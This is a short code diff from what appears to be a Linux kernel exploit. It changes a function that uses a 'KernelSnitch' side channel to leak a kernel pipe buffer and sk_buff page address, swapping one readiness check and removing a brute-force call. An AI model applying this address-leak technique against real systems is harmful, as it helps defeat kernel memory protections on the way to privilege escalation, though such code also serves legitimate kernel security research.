@@ -160,7 +160,10 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
   SYSCHK(waitpid(leak_child, NULL, 0));
 
-  if (!kernelsnitch_collisions_ready()) {
+  /* clone_leak_child() now runs the whole scan in the forked child, so the
+   * verdict is final here; kernelsnitch_collisions_ready() would assert
+   * on MM_FOUND. */
+  if (!kernelsnitch_mm_ready()) {
     pr_error("pipe KernelSnitch collision finding failed\n");
   }
 
@@ -208,7 +211,6 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   SYSCHK(close(leak_memfd));
   SYSCHK(sendmsg(skb_sv[0], &msg, 0));
 
-  run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
